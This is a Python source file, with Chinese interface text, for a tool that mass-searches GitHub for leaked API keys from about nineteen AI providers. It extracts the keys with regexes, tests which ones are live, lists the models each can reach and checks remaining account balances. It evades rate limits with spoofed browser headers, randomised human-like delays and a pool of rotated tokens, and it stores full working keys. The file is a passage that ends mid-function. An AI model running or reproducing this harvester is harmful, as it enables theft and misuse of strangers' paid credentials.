# GitHub APIKey 泄漏扫描
import argparse
import asyncio
import hashlib
import io
import json
import os
import re
import sys
import time
import random
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from typing import Optional

if sys.platform == "win32":
    for s in (sys.stdout, sys.stderr):
        try: s.reconfigure(encoding="utf-8", errors="replace")
        except: pass
    if sys.stdout.encoding.lower() not in ("utf-8","utf8"):
        try: sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
        except: pass

import aiohttp


# 配色
C = {"R":"\033[91m","G":"\033[92m","Y":"\033[93m","B":"\033[94m","M":"\033[95m","C":"\033[96m","W":"\033[97m","K":"\033[90m","rst":"\033[0m","bold":"\033[1m"}

def c(color, text):
    return f"{C.get(color,'')}{text}{C['rst']}"

LOGO = r"""
    █████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗    ██╗     ███████╗ █████╗ ██╗  ██╗
   ██╔══██╗██╔══██╗██║ ██╔╝██╔════╝╚██╗ ██╔╝    ██║     ██╔════╝██╔══██╗██║ ██╔╝
   ███████║██████╔╝█████╔╝ █████╗   ╚████╔╝     ██║     █████╗  ███████║█████╔╝
   ██╔══██║██╔═══╝ ██╔═██╗ ██╔══╝    ╚██╔╝      ██║     ██╔══╝  ██╔══██║██╔═██╗
   ██║  ██║██║     ██║  ██╗███████╗   ██║       ███████╗███████╗██║  ██║██║  ██╗
   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
"""


# 厂商
PROVIDER_CN = {
    "OpenAI":"OpenAI","DeepSeek":"DeepSeek","Anthropic":"Anthropic","Google AI (Gemini)":"Google AI",
    "HuggingFace":"HuggingFace","xAI (Grok)":"xAI","Cohere":"Cohere","Replicate":"Replicate",
    "Together AI":"Together","Mistral":"Mistral","Groq":"Groq","Perplexity":"Perplexity",
    "Jina AI":"Jina","Voyage AI":"Voyage","Fireworks AI":"Fireworks","DeepInfra":"DeepInfra",
    "Novita AI":"Novita","SiliconFlow":"SiliconFlow","AI21 Labs":"AI21",
}

class Provider(Enum):
    OPENAI="OpenAI"; DEEPSEEK="DeepSeek"; ANTHROPIC="Anthropic"; GOOGLE_AI="Google AI (Gemini)"
    HUGGINGFACE="HuggingFace"; XAI="xAI (Grok)"; COHERE="Cohere"; REPLICATE="Replicate"
    TOGETHER="Together AI"; MISTRAL="Mistral"; GROQ="Groq"; PERPLEXITY="Perplexity"
    JINA="Jina AI"; VOYAGE="Voyage AI"; FIREWORKS="Fireworks AI"; DEEPINFRA="DeepInfra"
    NOVITA="Novita AI"; SILICONFLOW="SiliconFlow"; AI21="AI21 Labs"

@dataclass
class ProviderDef:
    provider: Provider
    patterns: list[str] = field(default_factory=list)
    search_queries: list[str] = field(default_factory=list)
    validation_url: str = ""
    validation_header_name: str = "Authorization"
    validation_header_prefix: str = "Bearer "
    validation_method: str = "GET"
    validation_json: Optional[dict] = None
    models_url: str = ""
    models_header_name: str = "Authorization"
    models_header_prefix: str = "Bearer "
    ok_statuses: tuple = (200,)
    balance_url: str = ""
    balance_key_name: str = "Authorization"
    balance_key_prefix: str = "Bearer "

PROVIDERS: dict[Provider, ProviderDef] = {
    Provider.OPENAI: ProviderDef(Provider.OPENAI,
        patterns=[r'sk-(?:proj-|svcacct-)?[A-Za-z0-9_-]{20,}', r'sk-[A-Za-z0-9]{48}', r'sk-proj-[A-Za-z0-9_-]{80,}'],
        search_queries=["sk-proj-","sk-svcacct-",'"sk-" "openai"',"OPENAI_API_KEY"],
        validation_url="https://api.openai.com/v1/models", models_url="https://api.openai.com/v1/models",
        balance_url="https://api.openai.com/v1/dashboard/billing/subscription"),
    Provider.DEEPSEEK: ProviderDef(Provider.DEEPSEEK,
        patterns=[r'sk-[A-Fa-f0-9]{32}'],
        search_queries=['"sk-" "deepseek"',"DEEPSEEK_API_KEY","DEEPSEEK_KEY",'"sk-" "api.deepseek.com"'],
        validation_url="https://api.deepseek.com/v1/models", models_url="https://api.deepseek.com/v1/models",
        balance_url="https://api.deepseek.com/user/balance"),
    Provider.ANTHROPIC: ProviderDef(Provider.ANTHROPIC,
        patterns=[r'sk-ant-(?:api|admin)[0-9]{2}-[A-Za-z0-9_-]{80,}', r'sk-ant-[A-Za-z0-9_-]{60,}'],
        search_queries=["sk-ant-api","sk-ant-","ANTHROPIC_API_KEY","CLAUDE_API_KEY"],
        validation_url="https://api.anthropic.com/v1/messages", validation_header_name="x-api-key", validation_header_prefix="",
        validation_method="POST", validation_json={"model":"claude-haiku-4-5-20251001","max_tokens":1,"messages":[{"role":"user","content":"hi"}]},
        ok_statuses=(200,400), models_url=""),
    Provider.GOOGLE_AI: ProviderDef(Provider.GOOGLE_AI,
        patterns=[r'AIza[0-9A-Za-z_-]{35}'],
        search_queries=["AIza","GEMINI_API_KEY","GOOGLE_API_KEY","generativelanguage.googleapis.com"],
        validation_url="https://generativelanguage.googleapis.com/v1beta/models", validation_header_name="", validation_header_prefix="",
        models_url="https://generativelanguage.googleapis.com/v1beta/models", models_header_name="", models_header_prefix=""),
    Provider.HUGGINGFACE: ProviderDef(Provider.HUGGINGFACE,
        patterns=[r'hf_[A-Za-z0-9]{34}'],
        search_queries=["hf_","HUGGINGFACE_TOKEN","HUGGING_FACE_HUB_TOKEN","HF_TOKEN"],
        validation_url="https://huggingface.co/api/whoami-v2", models_url="https://huggingface.co/api/whoami-v2"),
    Provider.XAI: ProviderDef(Provider.XAI,
        patterns=[r'xai-[A-Za-z0-9]{40,}'],
        search_queries=["xai-","XAI_API_KEY",'"xai-" "api.x.ai"'],
        validation_url="https://api.x.ai/v1/models", models_url="https://api.x.ai/v1/models"),
    Provider.COHERE: ProviderDef(Provider.COHERE,
        patterns=[r'[A-Za-z0-9]{40}'],
        search_queries=["COHERE_API_KEY","CO_API_KEY",'"cohere" api_key'],
        validation_url="https://api.cohere.com/v1/models", models_url="https://api.cohere.com/v1/models"),
    Provider.REPLICATE: ProviderDef(Provider.REPLICATE,
        patterns=[r'r8_[A-Za-z0-9]{34}'],
        search_queries=["r8_","REPLICATE_API_TOKEN","REPLICATE_API_KEY"],
        validation_url="https://api.replicate.com/v1/models", models_url="https://api.replicate.com/v1/models"),
    Provider.TOGETHER: ProviderDef(Provider.TOGETHER,
        patterns=[r'[a-f0-9]{40,64}'],
        search_queries=["TOGETHER_API_KEY",'"together" "api_key"'],
        validation_url="https://api.together.xyz/v1/models", models_url="https://api.together.xyz/v1/models"),
    Provider.MISTRAL: ProviderDef(Provider.MISTRAL,
        patterns=[r'[A-Za-z0-9]{24,32}'],
        search_queries=["MISTRAL_API_KEY",'"mistral" "api_key"'],
        validation_url="https://api.mistral.ai/v1/models", models_url="https://api.mistral.ai/v1/models"),
    Provider.GROQ: ProviderDef(Provider.GROQ,
        patterns=[r'gsk_[A-Za-z0-9]{40,}'],
        search_queries=["gsk_","GROQ_API_KEY"],
        validation_url="https://api.groq.com/openai/v1/models", models_url="https://api.groq.com/openai/v1/models"),
    Provider.PERPLEXITY: ProviderDef(Provider.PERPLEXITY,
        patterns=[r'pplx-[A-Za-z0-9]{40,}'],
        search_queries=["pplx-","PERPLEXITY_API_KEY","PPLX_API_KEY"],
        validation_url="https://api.perplexity.ai/v1/models", validation_method="POST",
        validation_json={"model":"sonar-pro","messages":[{"role":"user","content":"hi"}],"max_tokens":1},
        ok_statuses=(200,400), models_url=""),
    Provider.JINA: ProviderDef(Provider.JINA,
        patterns=[r'jina_[A-Za-z0-9]{30,}'],
        search_queries=["jina_","JINA_API_KEY"],
        validation_url="https://api.jina.ai/v1/models", models_url=""),
    Provider.VOYAGE: ProviderDef(Provider.VOYAGE,
        patterns=[r'pa-[A-Za-z0-9]{30,}'],
        search_queries=["VOYAGE_API_KEY",'"pa-" "voyageai"'],
        validation_url="https://api.voyageai.com/v1/models", models_url=""),
    Provider.FIREWORKS: ProviderDef(Provider.FIREWORKS,
        patterns=[r'fw_[A-Za-z0-9]{30,}'],
        search_queries=["fw_","FIREWORKS_API_KEY"],
        validation_url="https://api.fireworks.ai/inference/v1/models", models_url="https://api.fireworks.ai/inference/v1/models"),
    Provider.DEEPINFRA: ProviderDef(Provider.DEEPINFRA,
        patterns=[r'[A-Za-z0-9]{20,40}'],
        search_queries=["DEEPINFRA_API_KEY",'"deepinfra" "api_key"'],
        validation_url="https://api.deepinfra.com/v1/openai/models", models_url="https://api.deepinfra.com/v1/openai/models"),
    Provider.NOVITA: ProviderDef(Provider.NOVITA,
        patterns=[r'[A-Za-z0-9_-]{30,50}'],
        search_queries=["NOVITA_API_KEY",'"novita" "api_key"'],
        validation_url="https://api.novita.ai/v3/openai/models", models_url="https://api.novita.ai/v3/openai/models"),
    Provider.SILICONFLOW: ProviderDef(Provider.SILICONFLOW,
        patterns=[r'sk-[A-Za-z0-9]{30,}'],
        search_queries=["SILICONFLOW_API_KEY",'"siliconflow" "sk-"'],
        validation_url="https://api.siliconflow.cn/v1/models", models_url="https://api.siliconflow.cn/v1/models"),
    Provider.AI21: ProviderDef(Provider.AI21,
        patterns=[r'[A-Za-z0-9]{20,40}'],
        search_queries=["AI21_API_KEY",'"ai21" "api_key"'],
        validation_url="https://api.ai21.com/studio/v1/models", models_url=""),
}

# 数据结构
@dataclass
class ValidatedKey:
    provider: str; provider_cn: str; key_full: str; key_hash: str
    models: list[str]; balance: str
    repo_url: str; file_path: str; found_at: str

@dataclass
class ScanStats:
    start_page:int=1; end_page:int=1; queries_run:int=0; files_fetched:int=0
    raw_keys_found:int=0; keys_tested:int=0; keys_valid:int=0
    start_time:str=""; end_time:str=""

# 全局
GITHUB_API = "https://api.github.com"
SEARCH_EP = f"{GITHUB_API}/search/code"
RAW_BASE = "https://raw.githubusercontent.com"
SEMAPHORE = None
TOKEN_POOL = []
TOKEN_STATE = {}
CUSTOM_QUERIES = []
SORT_FIELD = "indexed"
SORT_ORDER = "desc"
SEARCH_RATE = 10
_search_ts = []
_search_ts_lock = asyncio.Lock()

def _update_token(idx, remain, reset_ts):
    TOKEN_STATE[idx] = {"remain": remain, "reset": reset_ts}

def hkey(k): return hashlib.sha256(k.encode()).hexdigest()[:12]
def classify_key(key):
    l=key.lower()
    if l.startswith("sk-ant-"): return Provider.ANTHROPIC
    if l.startswith("sk-proj-") or l.startswith("sk-svcacct-"): return Provider.OPENAI
    if l.startswith("hf_"): return Provider.HUGGINGFACE
    if l.startswith("xai-"): return Provider.XAI
    if l.startswith("gsk_"): return Provider.GROQ
    if l.startswith("pplx-"): return Provider.PERPLEXITY
    if l.startswith("jina_"): return Provider.JINA
    if l.startswith("fw_"): return Provider.FIREWORKS
    if l.startswith("r8_"): return Provider.REPLICATE
    if l.startswith("pa-"): return Provider.VOYAGE
    if l.startswith("aiza"): return Provider.GOOGLE_AI
    if re.match(r'^sk-[A-Fa-f0-9]{32}$',key): return Provider.DEEPSEEK
    if l.startswith("sk-"): return Provider.OPENAI
    return None

# 反爬
_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
_ACCEPT_LANG = "zh-CN,zh;q=0.9,en;q=0.8"

def _build_headers(token_str):
    return {
        "Authorization": f"Bearer {token_str}",
        "User-Agent": _UA,
        "Accept": "application/vnd.github.v3+json",
        "Accept-Language": _ACCEPT_LANG,
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Referer": "https://github.com/search?q=api+key&type=code",
    }


def _human_delay(seconds):
    return max(0, random.gauss(seconds, seconds * 0.3))

_last_rest = time.time()

async def _maybe_rest():
    global _last_rest
    if time.time() - _last_rest > random.uniform(90, 180):
        pause = random.uniform(15, 45)
        await asyncio.sleep(pause)
        _last_rest = time.time()

# GitHub 搜索
async def _wait_rate():
    async with _search_ts_lock:
        now = time.time()
        cutoff = now - 60
        while _search_ts and _search_ts[0] < cutoff:
            _search_ts.pop(0)
        if len(_search_ts) >= SEARCH_RATE:
            wait = _search_ts[0] - cutoff + random.uniform(1, 5)
            if wait > 0:
                await asyncio.sleep(wait)
        _search_ts.append(time.time())

async def _do_search(session, query, page, page_size, token_idx, token_str):
    await _wait_rate()
    await _maybe_rest()
    if page == 1:
        await asyncio.sleep(_human_delay(5))
    elif page <= 3:
        await asyncio.sleep(_human_delay(1.5))
    else:
        await asyncio.sleep(_human_delay(0.5))
    hdrs = _build_headers(token_str)
    page_size = page_size - random.randint(0, 3)
    params = {"q": query, "per_page": str(page_size), "page": str(page)}
    if SORT_FIELD:
        params["sort"] = SORT_FIELD
        params["order"] = SORT_ORDER
    async with session.get(SEARCH_EP, headers=hdrs, params=params) as r:
        reset_ts = int(r.headers.get("X-RateLimit-Reset", time.time() + 60))
        remain = int(r.headers.get("X-RateLimit-Remaining", 30))
        _update_token(token_idx, remain, reset_ts)
        if r.status == 403:
            return 403, None, remain, reset_ts
        if r.status == 422:
            return 422, None, remain, reset_ts
        if r.status != 200:
            return r.status, None, remain, reset_ts
        data = await r.json()
        return 200, data.get("items", []), remain, reset_ts

async def fetch_file(session, item):
    name=item["repository"]["full_name"]; path=item["path"]
    html_url=item.get("html_url",""); branch="main"
    m=re.search(r'/blob/([^/]+)/',html_url)
    if m: branch=m.group(1)
    try:
        async with session.get(f"{RAW_BASE}/{name}/{branch}/{path}", timeout=aiohttp.ClientTimeout(total=10)) as r:
            if r.status!=200: return None
            return await r.text()
    except: return None

def extract_keys(text, pdef):
    found=set()
    for pat in pdef.patterns:
        for m in re.finditer(pat, text):
            k=m.group(0)
            if len(k)<10: continue
            if k.count("-")==0 and len(k)<20: continue
            kl=k.lower()
            if any(x in kl for x in ("your_","example","xxx","test_key","placeholder","<","abc123","abcdef","123456","qwerty","none")): continue
            found.add(k)
    return found

# 验证 余额查询
async def validate_key(session, key, pdef, repo_url, file_path):
    async with SEMAPHORE:
        try:
            ok=False
            hdrs={}
            if pdef.validation_header_name:
                hdrs[pdef.validation_header_name]=f"{pdef.validation_header_prefix}{key}"
            url=pdef.validation_url
            if pdef.provider==Provider.GOOGLE_AI: url=f"{url}?key={key}"
            method=pdef.validation_method
            kw={"headers":hdrs,"timeout":aiohttp.ClientTimeout(total=15)}
            if method=="POST" and pdef.validation_json: kw["json"]=pdef.validation_json
            async with session.request(method,url,**kw) as r:
                if r.status in pdef.ok_statuses: ok=True
                if r.status==429: ok=True
            if not ok: return None
            models=[]
            if pdef.models_url:
                models=await discover_models(session,key,pdef)
            balance=await check_balance(session,key,pdef)
            return ValidatedKey(
                provider=pdef.provider.value,
                provider_cn=PROVIDER_CN.get(pdef.provider.value,pdef.provider.value),
                key_full=key, key_hash=hkey(key), models=models, balance=balance,
                repo_url=repo_url, file_path=file_path,
                found_at=datetime.now(timezone.utc).isoformat())
        except: return None

async def discover_models(session, key, pdef):
    try:
        hdrs={}
        if pdef.models_header_name:
            hdrs[pdef.models_header_name]=f"{pdef.models_header_prefix}{key}"
        url=pdef.models_url
        if pdef.provider==Provider.GOOGLE_AI: url=f"{url}?key={key}"
        async with session.get(url,headers=hdrs,timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status!=200: return []
            d=await r.json()
            if isinstance(d,dict):
                if "data" in d and isinstance(d["data"],list):
                    return [m.get("id","") for m in d["data"]]
                if "models" in d and isinstance(d["models"],list):
                    return d["models"]
                if "results" in d and isinstance(d["results"],list):
                    return [m.get("id",m.get("name","")) for m in d["results"]]
            if isinstance(d,list):
                return [m.get("id",m.get("name",m if isinstance(m,str) else "")) for m in d]
            return []
    except: return []

async def check_balance(session, key, pdef):
    if not pdef.balance_url: return "--"
    try:
        hdrs = {pdef.balance_key_name: f"{pdef.balance_key_prefix}{key}"}
        url = pdef.balance_url
        if pdef.provider == Provider.GOOGLE_AI: url = f"{url}?key={key}"
        async with session.get(url, headers=hdrs, timeout=aiohttp.ClientTimeout(total=10)) as r:
            if r.status == 200:
                d = await r.json()
                if pdef.provider == Provider.DEEPSEEK:
                    infos = d.get("balance_infos", [])
                    if infos:
                        bal = infos[0].get("total_balance", "0")
                        cur = infos[0].get("currency", "CNY")
                        try:
                            bal_f = float(bal)
                            if abs(bal_f) < 0.005:
                                bal_f = 0.0
                            return f"{bal_f:.2f}|{cur}"
                        except:
                            return f"{bal}|{cur}"
                    return "--"
                if pdef.provider == Provider.OPENAI:
                    limit = float(d.get("hard_limit_usd", 0))
                    used = float(d.get("total_used", 0))
                    if limit > 0:
                        return f"{limit - used:.2f}|USD"
                    return "--"
                for k in ("balance", "credit", "credits", "remaining", "quota", "total_balance", "hard_limit_usd"):
                    if k in d:
                        v = d[k]
                        try:
                            bal_f = float(v)
                            if abs(bal_f) < 0.005:
                                bal_f = 0.0
                            return f"{bal_f:.2f}|USD" if bal_f > 0 else "--"
                        except:
                            return str(v) if v else "--"
            return "--"
    except: return "--"

# Token 池
class _AsyncTokenPool:
    def __init__(self, tokens):
        self.tokens = tokens
        self.lock = asyncio.Lock()
        self.busy = {i: False for i in range(len(tokens))}

    async def acquire(self):
        while True:
            async with self.lock:
                now = time.time()
                best_wait = None
                for i in range(len(self.tokens)):
                    if self.busy[i]:
                        continue
                    ts = TOKEN_STATE.get(i, {})
                    if ts.get("reset", 0) > now and ts.get("remain", 0) <= 0:
                        wait = ts["reset"] - now
                        if best_wait is None or wait < best_wait:
                            best_wait = wait
                        continue
                    self.busy[i] = True
                    return i, self.tokens[i]
                if best_wait and best_wait > 0:
                    wait_s = min(best_wait + 1, 60)
                else:
                    wait_s = 0.5
            await asyncio.sleep(wait_s)

    def release(self, idx):
        self.busy[idx] = False

    def status_line(self):
        now = time.time()
        parts = []
        for i in range(len(self.tokens)):
            ts = TOKEN_STATE.get(i, {})
            if self.busy[i]:
                parts.append(c("C", "▇"))
            elif ts.get("reset", 0) > now and ts.get("remain", 0) <= 0:
                parts.append(c("R", "▇"))
            elif ts.get("remain", 30) <= 3:
                parts.append(c("Y", "▇"))
            else:
                parts.append(c("G", "▇"))
        return "".join(parts) if parts else ""


async def _search_pages(session, query, start_page, end_page, token_idx, on_page=None):
    tk = TOKEN_POOL[token_idx]
    items = []
    for page in range(start_page, end_page + 1):
        for retry in range(3):
            status, batch, remain, reset_ts = await _do_search(session, query, page, 100, token_idx, tk)
            _update_token(token_idx, remain, reset_ts)
            if status == 422:
                return items
            if status == 403 or status == 429:
                wait = max(reset_ts - time.time(), 5)
                await asyncio.sleep(wait)
                continue
            if status != 200:
                await asyncio.sleep(2 ** retry)
                continue
            items.extend(batch)
            if on_page:
                await on_page()
            read_time = min(len(batch) * random.uniform(0.02, 0.08), 8)
            if read_time > 0.3:
                await asyncio.sleep(read_time)
            if random.random() < 0.15:
                await asyncio.sleep(random.uniform(1, 3))
            break
    return items


# 扫描
def _fmt_time(seconds):
    if seconds < 60: return f"{seconds:.0f}s"
    m, s = divmod(seconds, 60)
    return f"{m:.0f}m{s:.0f}s"


async def run_scan(start_page, end_page, concurrency, target, extra_queries=None):
    global SEMAPHORE
    SEMAPHORE = asyncio.Semaphore(concurrency)
    stats = ScanStats(start_page=start_page, end_page=end_page, start_time=datetime.now(timezone.utc).isoformat())
    target = target or list(PROVIDERS.keys())
    raw = {}; seen_files = set(); fetched_files = set(); vtasks = []; validated = []

    base_q = 0
    for pe in target:
        qs = list(PROVIDERS[pe].search_queries)
        if extra_queries: qs.extend(extra_queries)
        if CUSTOM_QUERIES: qs.extend(CUSTOM_QUERIES)
        base_q += len(qs)

    token_pool = _AsyncTokenPool(TOKEN_POOL)
    n_tokens = len(TOKEN_POOL)

    names = ", ".join(PROVIDER_CN.get(p.value, p.value) for p in target)
    print(f"\n  {c('B', '═' * 55)}")
    print(f"  {c('bold', '目标:')} {c('W', names)}")
    print(f"  {c('bold', '页码:')} {c('W', f'{start_page}-{end_page}')}")
    sort_info = f"{SORT_FIELD}/{SORT_ORDER}" if SORT_FIELD else "最佳匹配"
    print(f"  {c('bold', 'Token池:')} {c('W', str(n_tokens))}  {c('K', '│')}  {c('bold', '限速:')} {c('W', f'{SEARCH_RATE}次/分')}  {c('K', '│')}  {c('bold', '检索:')} {c('W', f'{base_q}次')}  {c('K', '│')}  {c('bold', '并发:')} {c('W', str(concurrency))}")
    print(f"  {c('bold', '排序:')} {c('W', sort_info)}")
    print(f"  {c('B', '═' * 55)}\n")
    print(f"  {c('C', '[>]')} {c('C', '开始检索')}\n")

    connector = aiohttp.TCPConnector(limit=20, limit_per_host=8, force_close=False, enable_cleanup_closed=True, keepalive_timeout=60)
    async with aiohttp.ClientSession(connector=connector, headers={"Accept-Encoding": "gzip, deflate, br"}) as session:
        async def fetch_and_extract(item, pe):
            fn = item["repository"]["full_name"]; fp = item["path"]
            if (fn, fp) in fetched_files: return []
            fetched_files.add((fn, fp))
            ct = await fetch_file(session, item)
            if not ct: return []
            ru = item["repository"]["html_url"]
            return [(k, ru, fp, classify_key(k) or pe) for k in extract_keys(ct, PROVIDERS[pe])]

        async def schedule_validation(key_text, repo_url, file_path, cp):
            pt = [cp]
            for pp in target:
                if pp != cp:
                    for pat in PROVIDERS[pp].patterns:
                        if re.fullmatch(pat, key_text):
                            pt.append(pp)
                            break
            pt = list(set(pt))
            for pp in pt:
                vtasks.append(asyncio.create_task(validate_key(session, key_text, PROVIDERS[pp], repo_url, file_path)))

        _sticky = ""

        def _upd(s):
            nonlocal _sticky
            _sticky = s
            sys.stdout.write(f"\r\033[2K  {s}")
            sys.stdout.flush()

        def _say(s):
            nonlocal _sticky
            sys.stdout.write(f"\r\033[2K{s}\n")
            if _sticky:
                sys.stdout.write(f"  {_sticky}")
            sys.stdout.flush()

        print(f"  {c('K', '─' * 50)}")
        print()

        # 组装搜索任务
        search_tasks = []
        for provider_enum in target:
            pdef = PROVIDERS[provider_enum]
            queries = list(pdef.search_queries)
            if extra_queries: queries.extend(extra_queries)
            if CUSTOM_QUERIES: queries.extend(CUSTOM_QUERIES)
            for q in queries:
                search_tasks.append((provider_enum, pdef, q))

        total_tasks = len(search_tasks)
        stats.queries_run += total_tasks
        search_sem = asyncio.Semaphore(min(concurrency, n_tokens * 5))

        completed = 0
        found_total = 0
        pages_done = 0
        total_pages = total_tasks * (end_page - start_page + 1)

        def _status():
            ts = token_pool.status_line()
            pg = f"{pages_done}/{total_pages}" if total_pages else "?"
            _upd(f"{c('K', 'Token[')}{ts}{c('K', ']')}  {c('K', '│')}  {c('C', f'页:{pg}')}  {c('K', '│')}  {c('G', f'命中:{found_total}')}  {c('Y', f'有效:{stats.keys_valid}')}  {c('C', f'验证中:{len(vtasks)}')}")

        _status()

        async def search_worker(task):
            provider_enum, pdef, full_query = task
            idx, tk = await token_pool.acquire()
            try:
                async def _page_done():
                    nonlocal pages_done
                    pages_done += 1
                    _status()
                items = await _search_pages(session, full_query, start_page, end_page, idx, on_page=_page_done)
                return items, provider_enum
            finally:
                token_pool.release(idx)

        async def _run_one(task):
            nonlocal completed, found_total
            async with search_sem:
                result = await search_worker(task)
            completed += 1
            items, _ = result
            found_total += len(items)
            _status()
            return result

        results = await asyncio.gather(*(_run_one(t) for t in search_tasks), return_exceptions=True)

        # 去重合并
        all_items = []
        for r in results:
            if isinstance(r, Exception):
                continue
            items, provider_enum = r
            for it in items:
                fn = it["repository"]["full_name"]
                fp = it["path"]
                if (fn, fp) not in seen_files:
                    seen_files.add((fn, fp))
                    all_items.append((it, provider_enum))

        stats.files_fetched += len(all_items)

        if all_items:
            _say(f"  {c('G', '[+]')} {c('G', f'共命中 {len(all_items)} 个文件')}，开始提取密钥 ...")

            for batch in batched(all_items, 30):
                br = await asyncio.gather(*(fetch_and_extract(it, pe) for it, pe in batch), return_exceptions=True)
                for result in br:
                    if isinstance(result, Exception):
                        continue
                    for key_text, repo_url, file_path, cls in result:
                        if key_text not in raw:
                            raw[key_text] = (repo_url, file_path, cls)
                            stats.raw_keys_found += 1
                            stats.keys_tested += 1
                            await schedule_validation(key_text, repo_url, file_path, cls)
                done = [t for t in vtasks if t.done()]
                for t in done:
                    try:
                        r = t.result()
                        if isinstance(r, ValidatedKey):
                            validated.append(r)
                            stats.keys_valid += 1
                    except:
                        pass
                vtasks = [t for t in vtasks if not t.done()]
                ts = token_pool.status_line()
                _upd(f"{c('K', 'Token[')}{ts}{c('K', ']')}  {c('K', '│')}  {c('G', f'已提取:{stats.raw_keys_found}')}  {c('Y', f'有效:{stats.keys_valid}')}  {c('C', f'验证中:{len(vtasks)}')}")
        else:
            _say(f"  {c('K', '[+]')} {c('K', '未发现匹配项')}")

        _say("")
        if vtasks:
            _say(f"  {c('C', '[*]')} {c('C', f'等待 {len(vtasks)} 个验证任务完成 ...')}")
            rem = await asyncio.gather(*vtasks, return_exceptions=True)
            for r in rem:
                if isinstance(r, ValidatedKey): validated.append(r); stats.keys_valid += 1
        # 清除状态栏
        sys.stdout.write(f"\r\033[2K")
        sys.stdout.flush()

    results={}; seen_h=set()
    for vk in validated:
        if vk.key_hash not in seen_h:
            seen_h.add(vk.key_hash)
            results.setdefault(vk.provider,[]).append(vk)

    stats.end_time=datetime.now(timezone.utc).isoformat()
    return results,stats

def batched(it,n):
    for i in range(0,len(it),n): yield it[i:i+n]

# 界面
def show_logo():
    print(LOGO)
    print(f"  {c('bold','GitHub  API Key leak')}  v1.2")
    print(f"  {c('K','仅限授权的安全研究使用')}\n")

# Token 本地保存
if getattr(sys, "frozen", False):
    TOKEN_STORE_FILE = os.path.join(os.path.dirname(sys.executable), ".token_store.json")
else:
    TOKEN_STORE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".token_store.json")

def _load_token_store():
    if not os.path.exists(TOKEN_STORE_FILE): return []
    try:
        with open(TOKEN_STORE_FILE, "r", encoding="utf-8") as f:
            return json.load(f).get("profiles", [])
    except: return []

def _save_token_profile(name, token_str):
    profiles = _load_token_store()
    # 去重
    profiles = [p for p in profiles if p["name"] != name]
    profiles.append({
        "name": name,
        "tokens": [x.strip() for x in token_str.split(",") if x.strip()],
        "created": datetime.now(timezone.utc).isoformat()
    })
    with open(TOKEN_STORE_FILE, "w", encoding="utf-8") as f:
        json.dump({"profiles": profiles}, f, indent=2, ensure_ascii=False)
    os.chmod(TOKEN_STORE_FILE, 0o600) if sys.platform != "win32" else None

def _delete_token_profile(name):
    profiles = [p for p in _load_token_store() if p["name"] != name]
    with open(TOKEN_STORE_FILE, "w", encoding="utf-8") as f:
        json.dump({"profiles": profiles}, f, indent=2, ensure_ascii=False)

def input_token():
    saved = _load_token_store()
    if saved:
        print(c("bold","\n[1/4] 配置GitHub Token"))
        print(f"  已保存的配置：")
        for i, p in enumerate(saved, 1):
            print(f"    {i}. {p['name']} ({len(p['tokens'])}个)")
        print(f"    {len(saved)+1}. 输入新的")
        print(f"    {len(saved)+2}. 删除配置")
        while True:
            try: ch = input("  > ").strip()
            except: return ""
            if ch == str(len(saved) + 1):
                return _manual_token_input(saved)
            if ch == str(len(saved) + 2):
                
                _delete_menu(saved)
                saved = _load_token_store()
                if not saved: return _manual_token_input([])
                continue
            try:
                idx = int(ch) - 1
                if 0 <= idx < len(saved):
                    t = ",".join(saved[idx]["tokens"])
                    print(f"  加载: {saved[idx]['name']} ({len(saved[idx]['tokens'])}个)")
                    return t
            except: pass
            print(f"  {c('R','无效选择')}")
    else:
        return _manual_token_input([])

def _manual_token_input(saved):
    print(c("bold","\n[1/4] 配置GitHub Token"))
    print(f"  {c('C','https://github.com/settings/tokens')}  -> 创建 classic token，不用勾权限")
    print(f"  支持多个同时输入（token越多 扫描速度越快） 多个用逗号/空格/换行隔开都行")
    all_tokens = []
    while True:
        print()
        if all_tokens:
            try: t = input(f"  Token ({c('K','继续粘贴 / 回车=确认')}): ").strip()
            except: return ""
        else:
            try: t = input("  Token: ").strip()
            except: return ""
        if not t:
            if all_tokens:
                break
            print(f"  {c('R','[!]')} 输入Token"); continue
        raw_parts = re.split(r'[,\s]+', t)
        new_tokens = [x.strip() for x in raw_parts if x.strip().startswith("ghp_") and not any(p in x.lower() for p in ("xxx","yyy","zzz","example","test_","your_","abc123","def456","ghi789","placeholder","<<","你的"))]
        if not new_tokens:
            if all_tokens:
                break
            print(f"  {c('R','[!]')} 未识别到有效的Token（ghp_开头）"); continue
        all_tokens.extend(new_tokens)
        seen = set()
        all_tokens = [x for x in all_tokens if not (x in seen or seen.add(x))]
        print(f"  已识别 {len(all_tokens)} 个")
        for i, tk in enumerate(all_tokens):
            print(f"    {i+1}. {c('K',tk[:6])}...{c('K',tk[-3:])}")

    if not all_tokens:
        return ""
    # 最终确认
    print(f"\n  共 {len(all_tokens)} 个 Token")
    try: cf = input(f"  确认? (回车=确认 / n=重来): ").strip().lower()
    except: cf = ""
    if cf and cf not in ("y", "yes", ""):
        return _manual_token_input(saved)
    t = ",".join(all_tokens)
    print()
    try: sv = input(f"  保存? 输入名称 / 回车跳过: ").strip()
    except: sv = ""
    if sv:
        sv = re.sub(r'ghp_[\w]+', '***', sv).strip()[:30]
        if sv:
            _save_token_profile(sv, t)
            print(f"  已保存: {sv}")
    return t

def _delete_menu(saved):
    print(f"\n  删哪个？")
    for i, p in enumerate(saved, 1):
        print(f"    {i}. {p['name']}")
    print(f"    {len(saved)+1}. 取消")
    try: ch = input("  > ").strip()
    except: return
    try:
        idx = int(ch) - 1
        if 0 <= idx < len(saved):
            _delete_token_profile(saved[idx]["name"])
            print(f"  已删除: {saved[idx]['name']}")
    except: pass

def select_providers():
    print(c("bold","\n[2/4] 选择厂商"))
    pl = list(Provider)
    for i, p in enumerate(pl, 1):
        cn = PROVIDER_CN.get(p.value, p.value)
